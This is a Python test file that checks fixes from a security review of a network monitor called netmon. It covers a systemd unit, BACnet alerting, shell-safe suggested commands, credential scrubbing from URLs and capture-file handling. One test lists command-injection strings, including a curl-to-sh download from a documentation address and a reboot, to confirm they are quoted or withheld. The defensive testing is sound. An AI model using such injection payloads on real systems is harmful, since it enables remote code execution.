"""
What the outside review of 2026-11-05 found in netmon.
======================================================
One section per finding, named by its number in the review. Each test failed
on the code before its fix.

No network: the controller, ntfy and the clock are fakes, as elsewhere in
netmon_tests. Addresses are 10.10.x, 192.168.10.x and documentation ranges, and
every name is made up.
"""

import os
import re
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import _test_support  # noqa: E402,F401

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXAMPLE = os.path.join(ROOT, 'netmon', 'profiles', 'example-site.yaml')
RULES = os.path.join(ROOT, 'netmon', 'rules')
DEPLOY = os.path.join(ROOT, 'netmon', 'deploy')


# ─── M23: the capture unit could not start ───────────────────────────────────

class TestTheCaptureUnitCanStart(unittest.TestCase):
    """
    systemd cannot run here, so this reads the unit. ProtectSystem=strict left
    /var read-only to the ExecStartPre mkdir, the bounding set had no CAP_CHOWN
    for its chown, and ReadWritePaths named a directory a fresh install does
    not have yet, which fails the namespace setup for the whole unit.
    """

    def settings(self, name):
        with open(os.path.join(DEPLOY, 'netmon-capture.service'),
                  encoding='utf-8') as handle:
            text = handle.read().replace('\\\n', ' ')
        return [line.split('=', 1)[1] for line in text.splitlines()
                if line.startswith(name + '=')]

    def test_the_directory_is_made_outside_the_sandbox(self):
        steps = self.settings('ExecStartPre')
        self.assertTrue(steps)
        for step in steps:
            with self.subTest(step=step.strip()):
                self.assertTrue(step.startswith('+'), step)

    def test_a_missing_directory_does_not_fail_the_namespace(self):
        paths = self.settings('ReadWritePaths')
        self.assertTrue(paths)
        for path in paths:
            with self.subTest(path=path.strip()):
                self.assertTrue(path.startswith('-'), path)

    def test_tcpdump_still_drops_to_the_netmon_user_itself(self):
        """
        User=netmon would start tcpdump unprivileged, and its -Z (which
        RingBuffer.capture_command emits) would then fail.
        """
        self.assertEqual(self.settings('User'), [])
        command = ' '.join(self.settings('ExecStart'))
        self.assertIn('-Z netmon', command)


# ─── M19: a BACnet SimpleACK raised a critical push ──────────────────────────

class TestBacnetAcknowledgements(unittest.TestCase):
    """
    A SimpleACK names the service it acknowledges, and the rule did not look
    at the APDU type, so the controller's reply to every allowed write was a
    critical finding of its own: the reply runs controller to workstation,
    which no allowlist entry covers.
    """

    @classmethod
    def setUpClass(cls):
        from netmon.profile import load_profile
        from netmon.rules_engine import load_rules
        cls.profile = load_profile(EXAMPLE)
        cls.rule = load_rules(RULES).by_id('bacnet_control')

    def fire(self, payload, src, dst):
        from netmon.events import Event, enrich
        from netmon.protocols.bacnet import parse
        event = Event(kind='bacnet', src_ip=src, dst_ip=dst, src_port=47808,
                      dst_port=47808, protocol='udp', vlan=20)
        event.fields.update(parse(payload).as_fields())
        enrich(event, self.profile)
        return self.rule.evaluate(event)

    @staticmethod
    def frame(apdu):
        body = bytes([0x01, 0x04]) + apdu
        return bytes([0x81, 0x0A]) + (4 + len(body)).to_bytes(2, 'big') + body

    def write_property(self):
        # Confirmed-Request, invoke 1, WriteProperty to analog-value-3.
        return self.frame(bytes([0x00, 0x05, 0x01, 15, 0x0C])
                          + ((2 << 22) | 3).to_bytes(4, 'big') + bytes([0x19, 85]))

    def simple_ack(self):
        return self.frame(bytes([0x20, 0x01, 15]))

    def test_the_acknowledgement_of_an_allowed_write_is_quiet(self):
        # 10.10.20.10 may write to 10.10.20.21 in the example profile.
        self.assertEqual(self.fire(self.write_property(),
                                   '10.10.20.10', '10.10.20.21'), [])
        self.assertEqual(self.fire(self.simple_ack(),
                                   '10.10.20.21', '10.10.20.10'), [])

    def test_a_write_outside_the_allowlist_still_fires(self):
        findings = self.fire(self.write_property(), '10.10.60.50', '10.10.20.21')
        self.assertEqual([f.rule_id for f in findings], ['bacnet_control'])
        self.assertEqual(findings[0].severity, 'critical')


# ─── M18: shell text in a suggested command ──────────────────────────────────

class TestSuggestedCommandsCarryNoShell(unittest.TestCase):
    """
    `next_check` is pasted into a root shell, and the names in it come from
    mDNS and DNS queries anyone on the network can send.
    """

    HOSTILE = ("printer$(touch /tmp/owned).local",
               "x'; curl http://203.0.113.9/s | sh; echo '",
               'name`id`', 'a;reboot', 'two\nlines')

    def unanswered(self, name):
        import netmon.handlers  # noqa: F401 -- registers the handler
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 'unanswered_name', 'type': 'stateful',
                     'handler': 'unanswered_name', 'params': {'min_queries': 1}})
        event = Event(kind='mdns', src_ip='192.168.10.20', ts=1000.0,
                      fields={'query': name})
        findings = rule.evaluate(event)
        self.assertEqual(len(findings), 1)
        return findings[0].next_check

    def test_the_unanswered_name_is_one_quoted_word(self):
        import shlex
        for name in self.HOSTILE + ('Büro Drucker.local',):
            with self.subTest(name=name):
                command = self.unanswered(name).split('; if it', 1)[0]
                self.assertEqual(shlex.split(command), ['nslookup', name.lower()])

    def rendered(self, template, **fields):
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 't', 'when': {'kind': 'tls'}, 'next_check': template})
        event = Event(kind='tls', src_ip='192.168.10.20', fields=fields)
        return rule.evaluate(event)[0].next_check

    def test_a_template_value_with_shell_characters_is_withheld(self):
        from netmon.rules_engine import UNSAFE_VALUE
        template = ("tshark -r <pcap> -Y 'tls.handshake.extensions_server_name "
                    "contains \"{sni}\"'")
        for value in self.HOSTILE:
            with self.subTest(value=value):
                command = self.rendered(template, sni=value)
                self.assertIn(UNSAFE_VALUE, command)
                self.assertNotIn(value, command)

    def test_ordinary_names_are_left_as_they_are(self):
        """Spaces and letters from any script: mDNS names have both."""
        for value in ('relay-9f2.net.example.test', 'Büro Drucker',
                      'fe80::1%eth0', '00:11:22:33:44:55', 'Kåre’s laptop'):
            with self.subTest(value=value):
                self.assertEqual(self.rendered("echo '{sni}'", sni=value),
                                 f"echo '{value}'")

    def test_descriptions_are_not_affected(self):
        """Only the command is pasted anywhere; a description is shown as text."""
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 't', 'when': {'kind': 'tls'},
                     'describe': 'reached {sni}'})
        event = Event(kind='tls', fields={'sni': 'a;b'})
        self.assertEqual(rule.evaluate(event)[0].description, 'reached a;b')


# ─── H11: passwords in UniFi CSV URLs reached pushes and the model ───────────

class TestUrlsLoseTheirCredentials(unittest.TestCase):
    """
    The export keeps the whole URL. `name_seen` fell back to it, and
    remote_access_tool's description renders `name_seen`, so a login submitted
    by GET was pushed with its password in it.
    """

    SECRETS = ('Hunter2', 'tok3nV4lue', 'ABCDEF0123')
    URL = ('https://ops:Hunter2@relay.anydesk.example.test:8443/connect;'
           'jsessionid=ABCDEF0123?user=ops&password=Hunter2&token=tok3nV4lue#top')

    def test_the_url_keeps_scheme_host_and_path(self):
        from netmon.sources.unifi_csv import scrub_url
        self.assertEqual(scrub_url(self.URL),
                         'https://relay.anydesk.example.test:8443/connect')
        self.assertEqual(scrub_url('portal.example.test/login?pwd=x'),
                         'portal.example.test/login')
        self.assertEqual(scrub_url('http://[fe80::1]:8080/a?b=c'),
                         'http://[fe80::1]:8080/a')
        self.assertEqual(scrub_url(''), '')
        self.assertEqual(scrub_url('http://[broken/x?password=y'), '')

    def row(self):
        from netmon_tests.test_unifi_csv import row
        return row(**{'Dst. Domain': '', 'URL': self.URL,
                      'Src. Ip': '10.10.60.50', 'Dst. Ip': '203.0.113.7'})

    def test_parse_row_drops_them(self):
        from netmon.sources.unifi_csv import parse_row
        event = parse_row(self.row())
        for secret in self.SECRETS:
            self.assertNotIn(secret, event.fields['url'])

    def test_name_seen_is_only_the_host(self):
        from netmon.events import Event, enrich
        from netmon.profile import load_profile
        event = Event(kind='http', src_ip='10.10.60.50', dst_ip='203.0.113.7',
                      fields={'url': 'http://user:pw@cam.example.test/a?b=c'})
        enrich(event, load_profile(EXAMPLE))
        self.assertEqual(event.fields['name_seen'], 'cam.example.test')

    def test_nothing_reaches_a_push_or_the_model(self):
        import json
        from netmon.events import enrich
        from netmon.profile import load_profile
        from netmon.redact import AI, ALERT, audit, redact_finding
        from netmon.rules_engine import load_rules
        from netmon.sources.unifi_csv import parse_row
        profile = load_profile(EXAMPLE)
        event = parse_row(self.row())
        enrich(event, profile)
        findings = load_rules(RULES).by_id('remote_access_tool').evaluate(event)
        self.assertEqual(len(findings), 1)
        for audience in (ALERT, AI):
            record = redact_finding(findings[0], profile, audience)
            blob = json.dumps(record, default=str)
            with self.subTest(audience=audience):
                for secret in self.SECRETS:
                    self.assertNotIn(secret, blob)
                self.assertEqual(audit(record), [])

    def test_the_audit_knows_the_shape(self):
        from netmon.redact import audit
        for text in ('https://x.example.test/login?user=a&password=b',
                     '/portal;token=abc', '?api_key=1', '&apikey=1',
                     '?PWD=1', '&secret=1', '?passwd=1'):
            with self.subTest(text=text):
                self.assertTrue(audit(text))
        for text in ('monkey=1&donkey=2', '?keyboard=uk', 'token bucket',
                     '/password-reset'):
            with self.subTest(text=text):
                self.assertEqual(audit(text), [])


# ─── M21: alert extracts were taken for captures ─────────────────────────────

class TestExtractsAreNotCaptures(unittest.TestCase):
    """
    Extracts are written into the capture directory, and any .pcap there was
    a capture, dated by its mtime. A fresh extract therefore sorted newest:
    the service took the live tcpdump file for a finished one and analysed it
    half-written on every pass, and the extract "covered" the present.
    """

    def setUp(self):
        import shutil
        import tempfile
        import time
        from netmon.ringbuffer import RingBuffer
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-ring-')
        self.addCleanup(shutil.rmtree, self.scratch, True)
        self.ring_dir = os.path.join(self.scratch, 'capture')
        os.makedirs(self.ring_dir)
        self.ring = RingBuffer(self.ring_dir)
        self.now = time.time()
        self.old = self.write(self.capture_name(self.now - 1800))
        self.live = self.write(self.capture_name(self.now - 600))
        self.extract = self.write('extract-20261105-101500.pcap', when=self.now)

    @staticmethod
    def capture_name(when):
        import time
        return time.strftime('netmon-%Y%m%d-%H%M%S.pcap', time.localtime(when))

    def write(self, name, when=None, size=64):
        path = os.path.join(self.ring_dir, name)
        with open(path, 'wb') as handle:
            handle.write(b'\0' * size)
        if when is not None:
            os.utime(path, (when, when))
        return path

    def test_the_ring_is_only_what_tcpdump_wrote(self):
        self.assertEqual([f['path'] for f in self.ring.files()],
                         [self.old, self.live])

    def test_the_present_is_covered_by_the_live_capture(self):
        covering = self.ring.files_covering(self.now - 10, self.now + 10)
        self.assertEqual([f['path'] for f in covering], [self.live])

    def test_the_live_capture_is_not_analysed(self):
        from netmon.service import Service, ServiceConfig
        config = ServiceConfig(profile_path=EXAMPLE, ring_dir=self.ring_dir,
                               state_dir=os.path.join(self.scratch, 'state'),
                               notify=False)
        config.web_port = None
        service = Service(config)
        with self.assertLogs('netmon.service', level='WARNING'):
            service.analyse_new_captures()          # the files are not pcaps
        self.assertIn(self.old, service.processed)
        self.assertNotIn(self.live, service.processed)
        self.assertNotIn(self.extract, service.processed)

    def test_extracts_are_pruned_by_age_and_count(self):
        self.ring.hours = 1
        self.ring.max_extracts = 2
        stale = self.write('extract-20261105-050000.pcap', when=self.now - 7200)
        recent = [self.write(f'extract-20261105-1{n}0000.pcap',
                             when=self.now - 300 + n) for n in range(3)]
        result = self.ring.prune(now=self.now)
        left = {e['path'] for e in self.ring.extracts()}
        self.assertNotIn(stale, left)
        self.assertEqual(left, {recent[2], self.extract})
        self.assertEqual(len(result['extracts_removed']), 3)
        # The captures are judged on their own terms, and none is old enough.
        self.assertEqual(result['removed'], [])


if __name__ == '__main__':
    unittest.main(verbosity=2)
